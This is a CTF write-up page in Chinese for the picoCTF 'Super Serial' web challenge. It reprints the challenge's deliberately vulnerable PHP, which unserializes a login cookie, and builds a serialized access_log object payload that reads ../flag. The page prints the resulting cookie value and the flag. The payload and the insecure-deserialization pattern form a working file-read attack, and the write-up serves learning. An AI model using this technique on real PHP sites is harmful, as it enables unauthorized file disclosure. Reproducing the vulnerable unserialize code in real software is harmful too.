<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  PicoCTF - Super Serial
  #


  tags: PicoCTF CTF Web
  #


  Background
  #

php unserialization

  Hint
  #


The flag is at ../flag


  Recon
  #

這一題設了太多套路了，但從題目的Title可以猜到應該要用不安全的反序列化


robot.txt
一開始會從這邊開始著手就是因為假的source code啥都沒有，本來也以為是sqli，但也沒收穫，看了WP才知道要從這邊開始，可以看到以下訊息，但副檔名居然不是一般的php而是phps(而且/admin.phps沒有任何東西)，可見php是個幌子，則前面的source code就要重新分析



index.phps
用index.phps查看source code發現有一些其他怪東西，包括authentication.phps和cookie.php
:::spoiler Real Source Code
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
    $con = new SQLite3("../users.db");
    $username = $_POST["user"];
    $password = $_POST["pass"];
    $perm_res = new permissions($username, $password);
    if ($perm_res->is_guest() || $perm_res->is_admin()) {
        setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
        header("Location: authentication.php");
        die();
    } else {
        $msg = &#39;<h6 class="text-center" style="color:red">Invalid Login.</h6>&#39;;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
    <body>
        <div class="container">
            <div class="row">
                <div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
                    <div class="card card-signin my-5">
                        <div class="card-body">
                            <h5 class="card-title text-center">Sign In</h5>
                            <?php if (isset($msg)) echo $msg; ?>
                            <form class="form-signin" action="index.php" method="post">
                                <div class="form-label-group">
                                    <input type="text" id="user" name="user" class="form-control" placeholder="Username" required autofocus>
                                    <label for="user">Username</label>
                                </div>

                                <div class="form-label-group">
                                    <input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required>
                                    <label for="pass">Password</label>
                                </div>

                                <button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Sign in</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>
:::'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/practice/picoctf/web/picoctf---super-serial/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="PicoCTF - Super Serial"><meta property="og:description" content='PicoCTF - Super Serial # tags: PicoCTF CTF Web # Background # php unserialization
Hint # The flag is at ../flag Recon # 這一題設了太多套路了，但從題目的Title可以猜到應該要用不安全的反序列化
robot.txt 一開始會從這邊開始著手就是因為假的source code啥都沒有，本來也以為是sqli，但也沒收穫，看了WP才知道要從這邊開始，可以看到以下訊息，但副檔名居然不是一般的php而是phps(而且/admin.phps沒有任何東西)，可見php是個幌子，則前面的source code就要重新分析 index.phps 用index.phps查看source code發現有一些其他怪東西，包括authentication.phps和cookie.php :::spoiler Real Source Code
<?php require_once("cookie.php"); if(isset($_POST["user"]) && isset($_POST["pass"])){ $con = new SQLite3("../users.db"); $username = $_POST["user"]; $password = $_POST["pass"]; $perm_res = new permissions($username, $password); if ($perm_res->is_guest() || $perm_res->is_admin()) { setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/"); header("Location: authentication.php"); die(); } else { $msg = &#39;<h6 class="text-center" style="color:red">Invalid Login.</h6>&#39;; } } ?> <!DOCTYPE html> <html> <head> <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"> <link href="style.css" rel="stylesheet"> <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script> </head> <body> <div class="container"> <div class="row"> <div class="col-sm-9 col-md-7 col-lg-5 mx-auto"> <div class="card card-signin my-5"> <div class="card-body"> <h5 class="card-title text-center">Sign In</h5> <?php if (isset($msg)) echo $msg; ?> <form class="form-signin" action="index.php" method="post"> <div class="form-label-group"> <input type="text" id="user" name="user" class="form-control" placeholder="Username" required autofocus> <label for="user">Username</label> </div> <div class="form-label-group"> <input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required> <label for="pass">Password</label> </div> <button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Sign in</button> </form> </div> </div> </div> </div> </div> </body> </html> :::'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="PicoCTF"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Web"><title>PicoCTF - Super Serial | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/practice/picoctf/web/picoctf---super-serial/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>PicoCTF - Super Serial</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#background>Background</a></li><li><a href=#hint>Hint</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit---unserialization>Exploit - Unserialization</a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=picoctf---super-serial>PicoCTF - Super Serial
<a class=anchor href=#picoctf---super-serial>#</a></h1><h6 id=tags-picoctf-ctf-web>tags: <code>PicoCTF</code> <code>CTF</code> <code>Web</code>
<a class=anchor href=#tags-picoctf-ctf-web>#</a></h6><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=https://hackmd.io/@SBK6401/B1I5n1pns>php unserialization</a></p><h2 id=hint>Hint
<a class=anchor href=#hint>#</a></h2><ul><li>The flag is at ../flag</li></ul><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>這一題設了太多套路了，但從題目的Title可以猜到應該要用不安全的反序列化</p><ol><li><p>robot.txt
一開始會從這邊開始著手就是因為假的source code啥都沒有，本來也以為是<code>sqli</code>，但也沒收穫，看了WP才知道要從這邊開始，可以看到以下訊息，但副檔名居然不是一般的php而是phps(而且<code>/admin.phps</code>沒有任何東西)，可見php是個幌子，則前面的source code就要重新分析
<img src=https://hackmd.io/_uploads/BkcThh0Pn.png alt></p></li><li><p>index.phps
用index.phps查看source code發現有一些其他怪東西，包括<code>authentication.phps</code>和<code>cookie.php</code>
:::spoiler Real Source Code</p><pre tabindex=0><code class="language-php=" data-lang="php=">&lt;?php
require_once(&#34;cookie.php&#34;);

if(isset($_POST[&#34;user&#34;]) &amp;&amp; isset($_POST[&#34;pass&#34;])){
    $con = new SQLite3(&#34;../users.db&#34;);
    $username = $_POST[&#34;user&#34;];
    $password = $_POST[&#34;pass&#34;];
    $perm_res = new permissions($username, $password);
    if ($perm_res-&gt;is_guest() || $perm_res-&gt;is_admin()) {
        setcookie(&#34;login&#34;, urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), &#34;/&#34;);
        header(&#34;Location: authentication.php&#34;);
        die();
    } else {
        $msg = &#39;&lt;h6 class=&#34;text-center&#34; style=&#34;color:red&#34;&gt;Invalid Login.&lt;/h6&gt;&#39;;
    }
}
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;link href=&#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css&#34; rel=&#34;stylesheet&#34; integrity=&#34;sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T&#34; crossorigin=&#34;anonymous&#34;&gt;
&lt;link href=&#34;style.css&#34; rel=&#34;stylesheet&#34;&gt;
&lt;script src=&#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js&#34; integrity=&#34;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM&#34; crossorigin=&#34;anonymous&#34;&gt;&lt;/script&gt;
&lt;/head&gt;
    &lt;body&gt;
        &lt;div class=&#34;container&#34;&gt;
            &lt;div class=&#34;row&#34;&gt;
                &lt;div class=&#34;col-sm-9 col-md-7 col-lg-5 mx-auto&#34;&gt;
                    &lt;div class=&#34;card card-signin my-5&#34;&gt;
                        &lt;div class=&#34;card-body&#34;&gt;
                            &lt;h5 class=&#34;card-title text-center&#34;&gt;Sign In&lt;/h5&gt;
                            &lt;?php if (isset($msg)) echo $msg; ?&gt;
                            &lt;form class=&#34;form-signin&#34; action=&#34;index.php&#34; method=&#34;post&#34;&gt;
                                &lt;div class=&#34;form-label-group&#34;&gt;
                                    &lt;input type=&#34;text&#34; id=&#34;user&#34; name=&#34;user&#34; class=&#34;form-control&#34; placeholder=&#34;Username&#34; required autofocus&gt;
                                    &lt;label for=&#34;user&#34;&gt;Username&lt;/label&gt;
                                &lt;/div&gt;

                                &lt;div class=&#34;form-label-group&#34;&gt;
                                    &lt;input type=&#34;password&#34; id=&#34;pass&#34; name=&#34;pass&#34; class=&#34;form-control&#34; placeholder=&#34;Password&#34; required&gt;
                                    &lt;label for=&#34;pass&#34;&gt;Password&lt;/label&gt;
                                &lt;/div&gt;

                                &lt;button class=&#34;btn btn-lg btn-primary btn-block text-uppercase&#34; type=&#34;submit&#34;&gt;Sign in&lt;/button&gt;
                            &lt;/form&gt;
                        &lt;/div&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre><p>:::</p></li><li><p>authentication.phps
:::spoiler Real Source Code</p><pre tabindex=0><code class="language-php=" data-lang="php=">&lt;?php

class access_log
{
    public $log_file;

    function __construct($lf) {
        $this-&gt;log_file = $lf;
    }

    function __toString() {
        return $this-&gt;read_log();
    }

    function append_to_log($data) {
        file_put_contents($this-&gt;log_file, $data, FILE_APPEND);
    }

    function read_log() {
        return file_get_contents($this-&gt;log_file);
    }
}

require_once(&#34;cookie.php&#34;);
if(isset($perm) &amp;&amp; $perm-&gt;is_admin()){
    $msg = &#34;Welcome admin&#34;;
    $log = new access_log(&#34;access.log&#34;);
    $log-&gt;append_to_log(&#34;Logged in at &#34;.date(&#34;Y-m-d&#34;).&#34;\n&#34;);
} else {
    $msg = &#34;Welcome guest&#34;;
}
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;link href=&#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css&#34; rel=&#34;stylesheet&#34; integrity=&#34;sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T&#34; crossorigin=&#34;anonymous&#34;&gt;
&lt;link href=&#34;style.css&#34; rel=&#34;stylesheet&#34;&gt;
&lt;script src=&#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js&#34; integrity=&#34;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM&#34; crossorigin=&#34;anonymous&#34;&gt;&lt;/script&gt;
&lt;/head&gt;
    &lt;body&gt;
        &lt;div class=&#34;container&#34;&gt;
            &lt;div class=&#34;row&#34;&gt;
                &lt;div class=&#34;col-sm-9 col-md-7 col-lg-5 mx-auto&#34;&gt;
                    &lt;div class=&#34;card card-signin my-5&#34;&gt;
                        &lt;div class=&#34;card-body&#34;&gt;
                            &lt;h5 class=&#34;card-title text-center&#34;&gt;&lt;?php echo $msg; ?&gt;&lt;/h5&gt;
                            &lt;form action=&#34;index.php&#34; method=&#34;get&#34;&gt;
                                &lt;button class=&#34;btn btn-lg btn-primary btn-block text-uppercase&#34; type=&#34;submit&#34; onclick=&#34;document.cookie=&#39;user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;&#39;&#34;&gt;Go back to login&lt;/button&gt;
                            &lt;/form&gt;
                        &lt;/div&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre><p>:::</p></li><li><p>cookie.phps
:::spoiler Real Source Code</p><pre tabindex=0><code class="language-php=" data-lang="php=">&lt;?php
session_start();

class permissions
{
    public $username;
    public $password;

    function __construct($u, $p) {
        $this-&gt;username = $u;
        $this-&gt;password = $p;
    }

    function __toString() {
        return $u.$p;
    }

    function is_guest() {
        $guest = false;

        $con = new SQLite3(&#34;../users.db&#34;);
        $username = $this-&gt;username;
        $password = $this-&gt;password;
        $stm = $con-&gt;prepare(&#34;SELECT admin, username FROM users WHERE username=? AND password=?&#34;);
        $stm-&gt;bindValue(1, $username, SQLITE3_TEXT);
        $stm-&gt;bindValue(2, $password, SQLITE3_TEXT);
        $res = $stm-&gt;execute();
        $rest = $res-&gt;fetchArray();
        if($rest[&#34;username&#34;]) {
            if ($rest[&#34;admin&#34;] != 1) {
                $guest = true;
            }
        }
        return $guest;
    }

        function is_admin() {
                $admin = false;

                $con = new SQLite3(&#34;../users.db&#34;);
                $username = $this-&gt;username;
                $password = $this-&gt;password;
                $stm = $con-&gt;prepare(&#34;SELECT admin, username FROM users WHERE username=? AND password=?&#34;);
                $stm-&gt;bindValue(1, $username, SQLITE3_TEXT);
                $stm-&gt;bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm-&gt;execute();
                $rest = $res-&gt;fetchArray();
                if($rest[&#34;username&#34;]) {
                        if ($rest[&#34;admin&#34;] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE[&#34;login&#34;])){
    try{
        $perm = unserialize(base64_decode(urldecode($_COOKIE[&#34;login&#34;])));
        $g = $perm-&gt;is_guest();
        $a = $perm-&gt;is_admin();
    }
    catch(Error $e){
        die(&#34;Deserialization error. &#34;.$perm);
    }
}

?&gt;
</code></pre><p>:::
這一題的直覺是用不安全的反序列化達到LFI或是RCE，問題是要利用哪一個class，可以看到這幾個file中只有<code>authentication.phps</code>中的<code>access_log</code>和<code>cookie.phps</code>中的<code>permission</code>，而考慮到hint提到flag的相對位置，代表應該可以確定是LFI的思路，則我們可以找有讀取file的class也就是<code>access_log</code>，另外<code>authentication.phps</code>也能單獨access，剩下的事情就簡單了，就construct一個exploit payload然後按照decode的順序反著做一次就可以了</p></li></ol><p>Note: 我再講詳細一點好了，不管是<code>index.phps</code>或是<code>authentication.phps</code>都會在一開始require <code>cookie.php</code>，代表他會執行以下這段程式，並且進行反序列化，而會用到LFI的class method是在<code>authentication.phps</code>中，所以我們要訪問的網頁應該是這個，然後要創建login cookie是因為<code>cookie.phps</code>需要這個東西才會進入判斷式</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_COOKIE[<span style=color:#e6db74>&#34;login&#34;</span>])){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>{
</span></span><span style=display:flex><span>        $perm <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>(<span style=color:#a6e22e>base64_decode</span>(<span style=color:#a6e22e>urldecode</span>($_COOKIE[<span style=color:#e6db74>&#34;login&#34;</span>])));
</span></span><span style=display:flex><span>        $g <span style=color:#f92672>=</span> $perm<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>is_guest</span>();
</span></span><span style=display:flex><span>        $a <span style=color:#f92672>=</span> $perm<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>is_admin</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>catch</span>(<span style=color:#a6e22e>Error</span> $e){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Deserialization error. &#34;</span><span style=color:#f92672>.</span>$perm);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=exploit---unserialization>Exploit - Unserialization
<a class=anchor href=#exploit---unserialization>#</a></h2><ol><li>php -a<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span> <span style=color:#a6e22e>php</span> <span style=color:#f92672>-</span><span style=color:#a6e22e>a</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>Interactive</span> <span style=color:#a6e22e>mode</span> <span style=color:#a6e22e>enabled</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>php</span> <span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>access_log</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>php</span> <span style=color:#f92672>&gt;</span> {
</span></span><span style=display:flex><span><span style=color:#a6e22e>php</span> {     <span style=color:#66d9ef>public</span> $log_file;
</span></span><span style=display:flex><span><span style=color:#a6e22e>php</span> {
</span></span><span style=display:flex><span><span style=color:#a6e22e>php</span> {     <span style=color:#66d9ef>function</span> __construct($lf) {
</span></span><span style=display:flex><span><span style=color:#a6e22e>php</span> {         $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>log_file</span> <span style=color:#f92672>=</span> $lf;
</span></span><span style=display:flex><span><span style=color:#a6e22e>php</span> {     }
</span></span><span style=display:flex><span><span style=color:#a6e22e>php</span> {
</span></span><span style=display:flex><span><span style=color:#a6e22e>php</span> {     <span style=color:#66d9ef>function</span> __toString() {
</span></span><span style=display:flex><span><span style=color:#a6e22e>php</span> {         <span style=color:#66d9ef>return</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>read_log</span>();
</span></span><span style=display:flex><span><span style=color:#a6e22e>php</span> {     }
</span></span><span style=display:flex><span><span style=color:#a6e22e>php</span> {
</span></span><span style=display:flex><span><span style=color:#a6e22e>php</span> {     <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>append_to_log</span>($data) {
</span></span><span style=display:flex><span><span style=color:#a6e22e>php</span> {         <span style=color:#a6e22e>file_put_contents</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>log_file</span>, $data, <span style=color:#a6e22e>FILE_APPEND</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>php</span> {     }
</span></span><span style=display:flex><span><span style=color:#a6e22e>php</span> {
</span></span><span style=display:flex><span><span style=color:#a6e22e>php</span> {     <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>read_log</span>() {
</span></span><span style=display:flex><span><span style=color:#a6e22e>php</span> {         <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>file_get_contents</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>log_file</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>php</span> {     }
</span></span><span style=display:flex><span><span style=color:#a6e22e>php</span> { }
</span></span><span style=display:flex><span><span style=color:#a6e22e>php</span> <span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>urlencode</span>(<span style=color:#a6e22e>base64_encode</span>(<span style=color:#a6e22e>serialize</span>(<span style=color:#66d9ef>new</span> <span style=color:#a6e22e>access_log</span>(<span style=color:#e6db74>&#34;../flag&#34;</span>))));
</span></span><span style=display:flex><span><span style=color:#a6e22e>TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9</span>
</span></span></code></pre></div></li><li>建一個cookie然後access authentication.phps
<img src=https://hackmd.io/_uploads/ByM5qVkdh.png alt></li></ol><p>Flag: <code>picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_405f4c0e}</code></p><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><p><a href=https://youtu.be/Eu3nFVAwAK0>picoCTF 2021 Super Serial</a></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#background>Background</a></li><li><a href=#hint>Hint</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit---unserialization>Exploit - Unserialization</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>